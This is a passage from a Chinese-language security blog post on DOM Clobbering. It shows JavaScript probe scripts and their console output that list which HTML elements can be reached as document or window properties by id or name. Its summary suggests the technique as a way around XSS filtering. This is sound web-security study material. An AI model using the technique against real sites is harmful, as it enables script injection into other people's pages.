class="string">"rb"</span>,<span class="string">"rp"</span>,<span class="string">"rt"</span>,<span class="string">"rtc"</span>,<span class="string">"ruby"</span>,<span class="string">"s"</span>,<span class="string">"samp"</span>,<span class="string">"script"</span>,<span class="string">"section"</span>,<span class="string">"select"</span>,<span class="string">"shadow"</span>,<span class="string">"slot"</span>,<span class="string">"small"</span>,<span class="string">"source"</span>,<span class="string">"spacer"</span>,<span class="string">"span"</span>,<span class="string">"strike"</span>,<span class="string">"strong"</span>,<span class="string">"style"</span>,<span class="string">"sub"</span>,<span class="string">"summary"</span>,<span class="string">"sup"</span>,<span class="string">"svg"</span>,<span class="string">"table"</span>,<span class="string">"tbody"</span>,<span class="string">"td"</span>,<span class="string">"template"</span>,<span class="string">"textarea"</span>,<span class="string">"tfoot"</span>,<span class="string">"th"</span>,<span class="string">"thead"</span>,<span class="string">"time"</span>,<span class="string">"title"</span>,<span class="string">"tr"</span>,<span class="string">"track"</span>,<span class="string">"tt"</span>,<span class="string">"u"</span>,<span class="string">"ul"</span>,<span class="string">"var"</span>,<span class="string">"video"</span>,<span class="string">"wbr"</span>,<span class="string">"xmp"</span>];</span><br><span class="line">    <span class="keyword">var</span> log = [];</span><br><span class="line">    <span class="keyword">var</span> div = <span class="built_in">document</span>.createElement(<span class="string">"div"</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; html.length; i++) &#123;</span><br><span class="line">        div.innerHTML = <span class="string">"&lt;"</span> + html[i] + <span class="string">" id=x &gt;"</span>;</span><br><span class="line">        <span class="built_in">document</span>.body.appendChild(div);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">document</span>.x == <span class="built_in">document</span>.getElementById(<span class="string">'x'</span>) &amp;&amp; <span class="built_in">document</span>.x != <span class="literal">undefined</span>) &#123;</span><br><span class="line">            log.push(html[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">document</span>.body.removeChild(div);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(log);</span><br></pre></td></tr></table></figure>

<h6 id="我们只得到了object标签可以通过document的id进行直接获取："><a href="#我们只得到了object标签可以通过document的id进行直接获取：" class="headerlink" title="我们只得到了object标签可以通过document的id进行直接获取："></a>我们只得到了<code>object</code>标签可以通过<code>document</code>的<code>id</code>进行直接获取：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;object&quot;]</span><br></pre></td></tr></table></figure>

<h5 id="2-Document-amp-Name"><a href="#2-Document-amp-Name" class="headerlink" title="2.Document &amp; Name"></a>2.<code>Document &amp; Name</code></h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> html = [<span class="string">"a"</span>,<span class="string">"abbr"</span>,<span class="string">"acronym"</span>,<span class="string">"address"</span>,<span class="string">"applet"</span>,<span class="string">"area"</span>,<span class="string">"article"</span>,<span class="string">"aside"</span>,<span class="string">"audio"</span>,<span class="string">"b"</span>,<span class="string">"base"</span>,<span class="string">"basefont"</span>,<span class="string">"bdi"</span>,<span class="string">"bdo"</span>,<span class="string">"bgsound"</span>,<span class="string">"big"</span>,<span class="string">"blink"</span>,<span class="string">"blockquote"</span>,<span class="string">"body"</span>,<span class="string">"br"</span>,<span class="string">"button"</span>,<span class="string">"canvas"</span>,<span class="string">"caption"</span>,<span class="string">"center"</span>,<span class="string">"cite"</span>,<span class="string">"code"</span>,<span class="string">"col"</span>,<span class="string">"colgroup"</span>,<span class="string">"command"</span>,<span class="string">"content"</span>,<span class="string">"data"</span>,<span class="string">"datalist"</span>,<span class="string">"dd"</span>,<span class="string">"del"</span>,<span class="string">"details"</span>,<span class="string">"dfn"</span>,<span class="string">"dialog"</span>,<span class="string">"dir"</span>,<span class="string">"div"</span>,<span class="string">"dl"</span>,<span class="string">"dt"</span>,<span class="string">"element"</span>,<span class="string">"em"</span>,<span class="string">"embed"</span>,<span class="string">"fieldset"</span>,<span class="string">"figcaption"</span>,<span class="string">"figure"</span>,<span class="string">"font"</span>,<span class="string">"footer"</span>,<span class="string">"form"</span>,<span class="string">"frame"</span>,<span class="string">"frameset"</span>,<span class="string">"h1"</span>,<span class="string">"head"</span>,<span class="string">"header"</span>,<span class="string">"hgroup"</span>,<span class="string">"hr"</span>,<span class="string">"html"</span>,<span class="string">"i"</span>,<span class="string">"iframe"</span>,<span class="string">"image"</span>,<span class="string">"img"</span>,<span class="string">"input"</span>,<span class="string">"ins"</span>,<span class="string">"isindex"</span>,<span class="string">"kbd"</span>,<span class="string">"keygen"</span>,<span class="string">"label"</span>,<span class="string">"legend"</span>,<span class="string">"li"</span>,<span class="string">"link"</span>,<span class="string">"listing"</span>,<span class="string">"main"</span>,<span class="string">"map"</span>,<span class="string">"mark"</span>,<span class="string">"marquee"</span>,<span class="string">"menu"</span>,<span class="string">"menuitem"</span>,<span class="string">"meta"</span>,<span class="string">"meter"</span>,<span class="string">"multicol"</span>,<span class="string">"nav"</span>,<span class="string">"nextid"</span>,<span class="string">"nobr"</span>,<span class="string">"noembed"</span>,<span class="string">"noframes"</span>,<span class="string">"noscript"</span>,<span class="string">"object"</span>,<span class="string">"ol"</span>,<span class="string">"optgroup"</span>,<span class="string">"option"</span>,<span class="string">"output"</span>,<span class="string">"p"</span>,<span class="string">"param"</span>,<span class="string">"picture"</span>,<span class="string">"plaintext"</span>,<span class="string">"pre"</span>,<span class="string">"progress"</span>,<span class="string">"q"</span>,<span class="string">"rb"</span>,<span class="string">"rp"</span>,<span class="string">"rt"</span>,<span class="string">"rtc"</span>,<span class="string">"ruby"</span>,<span class="string">"s"</span>,<span class="string">"samp"</span>,<span class="string">"script"</span>,<span class="string">"section"</span>,<span class="string">"select"</span>,<span class="string">"shadow"</span>,<span class="string">"slot"</span>,<span class="string">"small"</span>,<span class="string">"source"</span>,<span class="string">"spacer"</span>,<span class="string">"span"</span>,<span class="string">"strike"</span>,<span class="string">"strong"</span>,<span class="string">"style"</span>,<span class="string">"sub"</span>,<span class="string">"summary"</span>,<span class="string">"sup"</span>,<span class="string">"svg"</span>,<span class="string">"table"</span>,<span class="string">"tbody"</span>,<span class="string">"td"</span>,<span class="string">"template"</span>,<span class="string">"textarea"</span>,<span class="string">"tfoot"</span>,<span class="string">"th"</span>,<span class="string">"thead"</span>,<span class="string">"time"</span>,<span class="string">"title"</span>,<span class="string">"tr"</span>,<span class="string">"track"</span>,<span class="string">"tt"</span>,<span class="string">"u"</span>,<span class="string">"ul"</span>,<span class="string">"var"</span>,<span class="string">"video"</span>,<span class="string">"wbr"</span>,<span class="string">"xmp"</span>];</span><br><span class="line">    <span class="keyword">var</span> log = [];</span><br><span class="line">    <span class="keyword">var</span> div = <span class="built_in">document</span>.createElement(<span class="string">"div"</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; html.length; i++) &#123;</span><br><span class="line">        div.innerHTML = <span class="string">"&lt;"</span> + html[i] + <span class="string">" name=x &gt;"</span>;</span><br><span class="line">        <span class="built_in">document</span>.body.appendChild(div);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">document</span>.x == <span class="built_in">document</span>.getElementsByName(<span class="string">"x"</span>)[<span class="number">0</span>] &amp;&amp; <span class="built_in">document</span>.x != <span class="literal">undefined</span>) &#123;</span><br><span class="line">            log.push(html[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">document</span>.body.removeChild(div);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(log);</span><br></pre></td></tr></table></figure>

<h6 id="我们可以得到以下5个元素可以通过document的name来获取。"><a href="#我们可以得到以下5个元素可以通过document的name来获取。" class="headerlink" title="我们可以得到以下5个元素可以通过document的name来获取。"></a>我们可以得到以下5个元素可以通过<code>document</code>的<code>name</code>来获取。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;embed&quot;, &quot;form&quot;, &quot;image&quot;, &quot;img&quot;, &quot;object&quot;]</span><br></pre></td></tr></table></figure>

<h5 id="3-Document-amp-Name-amp-Id"><a href="#3-Document-amp-Name-amp-Id" class="headerlink" title="3.Document &amp; Name &amp; Id"></a>3.<code>Document &amp; Name &amp; Id</code></h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> html = [<span class="string">"a"</span>,<span class="string">"abbr"</span>,<span class="string">"acronym"</span>,<span class="string">"address"</span>,<span class="string">"applet"</span>,<span class="string">"area"</span>,<span class="string">"article"</span>,<span class="string">"aside"</span>,<span class="string">"audio"</span>,<span class="string">"b"</span>,<span class="string">"base"</span>,<span class="string">"basefont"</span>,<span class="string">"bdi"</span>,<span class="string">"bdo"</span>,<span class="string">"bgsound"</span>,<span class="string">"big"</span>,<span class="string">"blink"</span>,<span class="string">"blockquote"</span>,<span class="string">"body"</span>,<span class="string">"br"</span>,<span class="string">"button"</span>,<span class="string">"canvas"</span>,<span class="string">"caption"</span>,<span class="string">"center"</span>,<span class="string">"cite"</span>,<span class="string">"code"</span>,<span class="string">"col"</span>,<span class="string">"colgroup"</span>,<span class="string">"command"</span>,<span class="string">"content"</span>,<span class="string">"data"</span>,<span class="string">"datalist"</span>,<span class="string">"dd"</span>,<span class="string">"del"</span>,<span class="string">"details"</span>,<span class="string">"dfn"</span>,<span class="string">"dialog"</span>,<span class="string">"dir"</span>,<span class="string">"div"</span>,<span class="string">"dl"</span>,<span class="string">"dt"</span>,<span class="string">"element"</span>,<span class="string">"em"</span>,<span class="string">"embed"</span>,<span class="string">"fieldset"</span>,<span class="string">"figcaption"</span>,<span class="string">"figure"</span>,<span class="string">"font"</span>,<span class="string">"footer"</span>,<span class="string">"form"</span>,<span class="string">"frame"</span>,<span class="string">"frameset"</span>,<span class="string">"h1"</span>,<span class="string">"head"</span>,<span class="string">"header"</span>,<span class="string">"hgroup"</span>,<span class="string">"hr"</span>,<span class="string">"html"</span>,<span class="string">"i"</span>,<span class="string">"iframe"</span>,<span class="string">"image"</span>,<span class="string">"img"</span>,<span class="string">"input"</span>,<span class="string">"ins"</span>,<span class="string">"isindex"</span>,<span class="string">"kbd"</span>,<span class="string">"keygen"</span>,<span class="string">"label"</span>,<span class="string">"legend"</span>,<span class="string">"li"</span>,<span class="string">"link"</span>,<span class="string">"listing"</span>,<span class="string">"main"</span>,<span class="string">"map"</span>,<span class="string">"mark"</span>,<span class="string">"marquee"</span>,<span class="string">"menu"</span>,<span class="string">"menuitem"</span>,<span class="string">"meta"</span>,<span class="string">"meter"</span>,<span class="string">"multicol"</span>,<span class="string">"nav"</span>,<span class="string">"nextid"</span>,<span class="string">"nobr"</span>,<span class="string">"noembed"</span>,<span class="string">"noframes"</span>,<span class="string">"noscript"</span>,<span class="string">"object"</span>,<span class="string">"ol"</span>,<span class="string">"optgroup"</span>,<span class="string">"option"</span>,<span class="string">"output"</span>,<span class="string">"p"</span>,<span class="string">"param"</span>,<span class="string">"picture"</span>,<span class="string">"plaintext"</span>,<span class="string">"pre"</span>,<span class="string">"progress"</span>,<span class="string">"q"</span>,<span class="string">"rb"</span>,<span class="string">"rp"</span>,<span class="string">"rt"</span>,<span class="string">"rtc"</span>,<span class="string">"ruby"</span>,<span class="string">"s"</span>,<span class="string">"samp"</span>,<span class="string">"script"</span>,<span class="string">"section"</span>,<span class="string">"select"</span>,<span class="string">"shadow"</span>,<span class="string">"slot"</span>,<span class="string">"small"</span>,<span class="string">"source"</span>,<span class="string">"spacer"</span>,<span class="string">"span"</span>,<span class="string">"strike"</span>,<span class="string">"strong"</span>,<span class="string">"style"</span>,<span class="string">"sub"</span>,<span class="string">"summary"</span>,<span class="string">"sup"</span>,<span class="string">"svg"</span>,<span class="string">"table"</span>,<span class="string">"tbody"</span>,<span class="string">"td"</span>,<span class="string">"template"</span>,<span class="string">"textarea"</span>,<span class="string">"tfoot"</span>,<span class="string">"th"</span>,<span class="string">"thead"</span>,<span class="string">"time"</span>,<span class="string">"title"</span>,<span class="string">"tr"</span>,<span class="string">"track"</span>,<span class="string">"tt"</span>,<span class="string">"u"</span>,<span class="string">"ul"</span>,<span class="string">"var"</span>,<span class="string">"video"</span>,<span class="string">"wbr"</span>,<span class="string">"xmp"</span>];</span><br><span class="line"><span class="keyword">var</span> log = [];</span><br><span class="line"><span class="keyword">var</span> div = <span class="built_in">document</span>.createElement(<span class="string">"div"</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; html.length; i++) &#123;</span><br><span class="line">    div.innerHTML = <span class="string">"&lt;"</span> + html[i] + <span class="string">" id=x name=y &gt;"</span>;</span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(div);</span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        <span class="built_in">document</span>.x == <span class="built_in">document</span>.getElementsByName(<span class="string">"y"</span>)[<span class="number">0</span>] &amp;&amp; <span class="built_in">document</span>.x != <span class="literal">undefined</span></span><br><span class="line">    ) &#123;</span><br><span class="line">        log.push(html[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">document</span>.body.removeChild(div);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(log);</span><br></pre></td></tr></table></figure>

<h6 id="我们可以得到下面3个元素是可以通过document-39-id-39-和document-39-name-39-来获取的。"><a href="#我们可以得到下面3个元素是可以通过document-39-id-39-和document-39-name-39-来获取的。" class="headerlink" title="我们可以得到下面3个元素是可以通过document[&#39;id&#39;]和document[&#39;name&#39;]来获取的。"></a>我们可以得到下面3个元素是可以通过<code>document[&#39;id&#39;]</code>和<code>document[&#39;name&#39;]</code>来获取的。</h6><h5 id="4-Window-amp-Id"><a href="#4-Window-amp-Id" class="headerlink" title="4.Window &amp; Id"></a>4.<code>Window &amp; Id</code></h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> html = [...];<span class="comment">//HTML elements array</span></span><br><span class="line"><span class="keyword">var</span> log = [];</span><br><span class="line"><span class="keyword">var</span> div = <span class="built_in">document</span>.createElement(<span class="string">"div"</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; html.length; i++) &#123;</span><br><span class="line">  div.innerHTML = <span class="string">"&lt;"</span> + html[i] + <span class="string">" id=x &gt;"</span>;</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(div);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">window</span>.x == <span class="built_in">document</span>.getElementById(<span class="string">'x'</span>) &amp;&amp; <span class="built_in">window</span>.x != <span class="literal">undefined</span>) &#123;</span><br><span class="line">    log.push(html[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">document</span>.body.removeChild(div);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(log);</span><br></pre></td></tr></table></figure>

<h6 id="我们可以通过window的id直接获取的元素有："><a href="#我们可以通过window的id直接获取的元素有：" class="headerlink" title="我们可以通过window的id直接获取的元素有："></a>我们可以通过<code>window</code>的<code>id</code>直接获取的元素有：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(128) [&quot;a&quot;, &quot;abbr&quot;, &quot;acronym&quot;, &quot;address&quot;, &quot;applet&quot;, &quot;area&quot;, &quot;article&quot;, &quot;aside&quot;, &quot;audio&quot;, &quot;b&quot;, &quot;base&quot;, &quot;basefont&quot;, &quot;bdi&quot;, &quot;bdo&quot;, &quot;bgsound&quot;, &quot;big&quot;, &quot;blink&quot;, &quot;blockquote&quot;, &quot;br&quot;, &quot;button&quot;, &quot;canvas&quot;, &quot;center&quot;, &quot;cite&quot;, &quot;code&quot;, &quot;command&quot;, &quot;content&quot;, &quot;data&quot;, &quot;datalist&quot;, &quot;dd&quot;, &quot;del&quot;, &quot;details&quot;, &quot;dfn&quot;, &quot;dialog&quot;, &quot;dir&quot;, &quot;div&quot;, &quot;dl&quot;, &quot;dt&quot;, &quot;element&quot;, &quot;em&quot;, &quot;embed&quot;, &quot;fieldset&quot;, &quot;figcaption&quot;, &quot;figure&quot;, &quot;font&quot;, &quot;footer&quot;, &quot;form&quot;, &quot;h1&quot;, &quot;header&quot;, &quot;hgroup&quot;, &quot;hr&quot;, &quot;i&quot;, &quot;iframe&quot;, &quot;iframes&quot;, &quot;image&quot;, &quot;img&quot;, &quot;input&quot;, &quot;ins&quot;, &quot;isindex&quot;, &quot;kbd&quot;, &quot;keygen&quot;, &quot;label&quot;, &quot;legend&quot;, &quot;li&quot;, &quot;link&quot;, &quot;listing&quot;, &quot;main&quot;, &quot;map&quot;, &quot;mark&quot;, &quot;marquee&quot;, &quot;menu&quot;, &quot;menuitem&quot;, &quot;meta&quot;, &quot;meter&quot;, &quot;multicol&quot;, &quot;nav&quot;, &quot;nextid&quot;, &quot;nobr&quot;, &quot;noembed&quot;, &quot;noframes&quot;, &quot;noscript&quot;, &quot;object&quot;, &quot;ol&quot;, &quot;optgroup&quot;, &quot;option&quot;, &quot;output&quot;, &quot;p&quot;, &quot;param&quot;, &quot;picture&quot;, &quot;plaintext&quot;, &quot;pre&quot;, &quot;progress&quot;, &quot;q&quot;, &quot;rb&quot;, &quot;rp&quot;, &quot;rt&quot;, &quot;rtc&quot;, &quot;ruby&quot;, &quot;s&quot;, &quot;samp&quot;, &quot;script&quot;, …]</span><br></pre></td></tr></table></figure>

<h6 id="我们不可以通过window的id获取的元素。"><a href="#我们不可以通过window的id获取的元素。" class="headerlink" title="我们不可以通过window的id获取的元素。"></a>我们不可以通过<code>window</code>的<code>id</code>获取的元素。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;body&quot;, &quot;caption&quot;, &quot;col&quot;, &quot;colgroup&quot;, &quot;frame&quot;, &quot;frameset&quot;, &quot;head&quot;, &quot;html&quot;, &quot;tbody&quot;, &quot;td&quot;, &quot;tfoot&quot;, &quot;th&quot;, &quot;thead&quot;, &quot;tr&quot;]</span><br></pre></td></tr></table></figure>

<h6 id="PS-这部分并不是真正不能-Clobbered-，因为比如说body，因为我本身界面存在一个body标签，只是在我测试构建的简单的-HTML-页面中，这些标签不能被-Clobbered-，而且在实际中也用到比较少。并且根据-Chromium-中的说法是”but-anything-by-id”，所以如果需要通过Window-id的形式去获取标签的话，还有很多标签可以使用，或者也可以尽力去构建下文的要求。"><a href="#PS-这部分并不是真正不能-Clobbered-，因为比如说body，因为我本身界面存在一个body标签，只是在我测试构建的简单的-HTML-页面中，这些标签不能被-Clobbered-，而且在实际中也用到比较少。并且根据-Chromium-中的说法是”but-anything-by-id”，所以如果需要通过Window-id的形式去获取标签的话，还有很多标签可以使用，或者也可以尽力去构建下文的要求。" class="headerlink" title="PS: 这部分并不是真正不能 Clobbered ，因为比如说body，因为我本身界面存在一个body标签，只是在我测试构建的简单的 HTML 页面中，这些标签不能被 Clobbered ，而且在实际中也用到比较少。并且根据 Chromium 中的说法是”but anything by id”，所以如果需要通过Window.id的形式去获取标签的话，还有很多标签可以使用，或者也可以尽力去构建下文的要求。"></a>PS: 这部分并不是真正不能 Clobbered ，因为比如说<code>body</code>，因为我本身界面存在一个<code>body</code>标签，只是在我测试构建的简单的 HTML 页面中，这些标签不能被 Clobbered ，而且在实际中也用到比较少。并且根据 Chromium 中的说法是”but anything by id”，所以如果需要通过<code>Window.id</code>的形式去获取标签的话，还有很多标签可以使用，或者也可以尽力去构建下文的要求。</h6><h5 id="5-Window-amp-Name"><a href="#5-Window-amp-Name" class="headerlink" title="5.Window &amp; Name"></a>5.<code>Window &amp; Name</code></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.x == document.getElementsByName(&quot;x&quot;)[0] &amp;&amp; window.x != undefined</span><br></pre></td></tr></table></figure>

<h6 id="这里与-document-一致，只有五个标签可以让window通过-name-进行直接获取"><a href="#这里与-document-一致，只有五个标签可以让window通过-name-进行直接获取" class="headerlink" title="这里与 document 一致，只有五个标签可以让window通过 name 进行直接获取"></a>这里与 document 一致，只有五个标签可以让<code>window</code>通过 name 进行直接获取</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;embed&quot;, &quot;form&quot;, &quot;image&quot;, &quot;img&quot;, &quot;object&quot;]</span><br></pre></td></tr></table></figure>

<h4 id="0x08-总结"><a href="#0x08-总结" class="headerlink" title="0x08 总结"></a>0x08 总结</h4><h6 id="当我们输入的字符被过滤，不能xss时，但是又能输出标签时，是不是可以考虑DOM-Clobbering-Attack呢？"><a href="#当我们输入的字符被过滤，不能xss时，但是又能输出标签时，是不是可以考虑DOM-Clobbering-Attack呢？" class="headerlink" title="当我们输入的字符被过滤，不能xss时，但是又能输出标签时，是不是可以考虑DOM Clobbering Attack呢？"></a>当我们输入的字符被过滤，不能xss时，但是又能输出标签时，是不是可以考虑DOM Clobbering Attack呢？</h6><h4 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h4><h5 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h5><h6 id="http-d1iv3-me-2018-04-11-DOM-Clobbering-Attack"><a href="#http-d1iv3-me-2018-04-11-DOM-Clobbering-Attack" class="headerlink" title="http://d1iv3.me/2018/04/11/DOM-Clobbering-Attack/"></a><a href="http://d1iv3.me/2018/04/11/DOM-Clobbering-Attack/" target="_blank" rel="noopener">http://d1iv3.me/2018/04/11/DOM-Clobbering-Attack/</a></h6><h6 id="https-juejin-im-post-5abb99e9f265da2392366824"><a href="#https-juejin-im-post-5abb99e9f265da2392366824" class="headerlink" title="https://juejin.im/post/5abb99e9f265da2392366824"></a><a href="https://juejin.im/post/5abb99e9f265da2392366824" target="_blank" rel="noopener">https://juejin.im/post/5abb99e9f265da2392366824</a></h6><h6 id="https-wonderkun-cc-2020-02-15-DOM-20Clobbering-20Attack-E5-AD-A6-E4-B9-A0-E8-AE-B0-E5-BD-95"><a href="#https-wonderkun-cc-2020-02-15-DOM-20Clobbering-20Attack-E5-AD-A6-E4-B9-A0-E8-AE-B0-E5-BD-95" class="headerlink" title="https://wonderkun.cc/2020/02/15/DOM%20Clobbering%20Attack%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"></a><a href="https://wonderkun.cc/2020/02/15/DOM%20Clobbering%20Attack%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" target="_blank" rel="noopener">https://wonderkun.cc/2020/02/15/DOM%20Clobbering%20Attack%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</a></h6><h6 id="https-portswigger-net-research-dom-clobbering-strikes-back"><a href="#https-portswigger-net-research-dom-clobbering-strikes-back" class="headerlink" title="https://portswigger.net/research/dom-clobbering-strikes-back"></a><a href="https://portswigger.net/research/dom-clobbering-strikes-back" target="_blank" rel="noopener">https://portswigger.net/research/dom-clobbering-strikes-back</a></h6><h6 id="https-xz-aliyun-com-t-7346"><a href="#https-xz-aliyun-com-t-7346" class="headerlink" title="https://xz.aliyun.com/t/7346"></a><a href="https://xz.aliyun.com/t/7346" target="_blank" rel="noopener">https://xz.aliyun.com/t/7346</a></h6><h6 id="https-xz-aliyun-com-t-7329-toc-14"><a href="#https-xz-aliyun-com-t-7329-toc-14" class="headerlink" title="https://xz.aliyun.com/t/7329#toc-14"></a><a href="https://xz.aliyun.com/t/7329#toc-14" target="_blank" rel="noopener">https://xz.aliyun.com/t/7329#toc-14</a></h6><h6 id="https-medium-com-terjanq-dom-clobbering-techniques-8443547ebe94"><a href="#https-medium-com-terjanq-dom-clobbering-techniques-8443547ebe94" class="headerlink" title="https://medium.com/@terjanq/dom-clobbering-techniques-8443547ebe94"></a><a href="https://medium.com/@terjanq/dom-clobbering-techniques-8443547ebe94" target="_blank" rel="noopener">https://medium.com/@terjanq/dom-clobbering-techniques-8443547ebe94</a></h6><h6 id="https-xz-aliyun-com-t-7343"><a href="#https-xz-aliyun-com-t-7343" class="headerlink" title="https://xz.aliyun.com/t/7343"></a><a href="https://xz.aliyun.com/t/7343" target="_blank" rel="noopener">https://xz.aliyun.com/t/7343</a></h6>
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2020/02/09/读书日记十一/" rel="next" title="读书日记十一">
                <i class="fa fa-chevron-left"></i> 读书日记十一
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2020/03/14/记录一下XSS-Game的过程/" rel="prev" title="记录一下XSS Game的过程">
                记录一下XSS Game的过程 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Ljdd520">
            
              <p class="site-author-name" itemprop="name">Ljdd520</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">48</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">10</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:yourname@gmail.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                友情链接
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://blog.wonderkun.cc/" title="wonderkun" target="_blank">wonderkun</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://example.com/" title="Title" target="_blank">Title</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-简介"><span class="nav-number">1.1.</span> <span class="nav-text">0x01 简介</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#DOM最初诞生的时候没有一个很好的标准，以至于各个浏览器在实现的过程中会支持DOM的一些怪异行为，而这些行为可能会导致DOM-Clobbering的发生浏览器可能会将各种DOM元素的name和id属性添加为document的属性或页面的全局变量，这会导致覆盖掉document原有的属性或全局变量，或者劫持一些变量的内容。"><span class="nav-number">1.1.0.1.</span> <span class="nav-text">DOM最初诞生的时候没有一个很好的标准，以至于各个浏览器在实现的过程中会支持DOM的一些怪异行为，而这些行为可能会导致DOM Clobbering的发生浏览器可能会将各种DOM元素的name和id属性添加为document的属性或页面的全局变量，这会导致覆盖掉document原有的属性或全局变量，或者劫持一些变量的内容。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#测试环境-Chrome-80-0-3987-132"><span class="nav-number">1.1.0.2.</span> <span class="nav-text">测试环境 Chrome 80.0.3987.132</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a 